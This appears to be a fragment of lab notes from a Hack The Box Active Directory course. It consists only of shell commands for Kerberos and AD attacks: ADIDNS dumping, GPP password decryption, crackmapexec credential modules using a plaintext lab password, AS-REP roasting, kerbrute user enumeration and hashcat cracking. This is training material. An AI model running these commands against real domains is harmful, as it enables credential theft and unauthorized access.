...
```shell-session
swmpdnky@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
...
```shell-session
swmpdnky@htb[/htb]$ head records.csv 
...
```shell-session
swmpdnky@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
...
```shell-session
swmpdnky@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
...
```shell-session
swmpdnky@htb[/htb]$ crackmapexec smb -L | grep gpp
...
```shell-session
swmpdnky@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
...
```shell-session
swmpdnky@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
...
```shell-session
swmpdnky@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
...
```shell-session
swmpdnky@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
